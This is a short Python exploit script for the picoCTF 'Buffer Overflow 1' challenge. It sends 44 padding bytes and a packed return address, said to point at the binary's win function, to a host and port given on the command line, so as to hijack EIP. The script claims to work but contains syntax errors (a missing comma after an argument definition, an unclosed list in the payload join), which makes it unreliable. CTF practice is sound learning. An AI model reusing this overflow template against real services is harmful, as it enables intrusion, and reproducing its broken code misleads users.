#!/bin/python3
#Python script for picoCTF Buffer Overflow 1

#Made w/ Love by root_null 
#	(Only Possible w/ the help of 
#	John Hammond's Youtube Channel)

#Exploit.py for buffer overflow picoCTF

#Currenly Works as is 9/22

import socket
import argparse
import struct

new_eip = struct.pack(
	"<I", 0x080491f6
)

parser = argparse.ArgumentParser()
parser.add_argument(
	"host",
	type=str,
	help="The hostname or IP address to connect to",
	)
parser.add_argument(
	"port",
	type=int
	help="The port for the service to connect to",
	)

args = parser.parse_args()

offset = 44

#
new_eip = struct.pack("<I", 0x080491f6) 
#win function withinthe vuln binary
#

#new_eip=b"\xf6\x91\x04\x08"

payload = b"".join(
	[
		b"A"*44,
		new_eip,
	]

payload += b"\n"

with socket.socket() as connection:
	
	connection.connect((args.host, args.port))
	connection.recv(4096).decode("utf-8")
	connection.send(payload)
	(connection.recv(4096).decode("utf-8"))
	print(connection.recv(4096).decode("utf-8"))

exit()
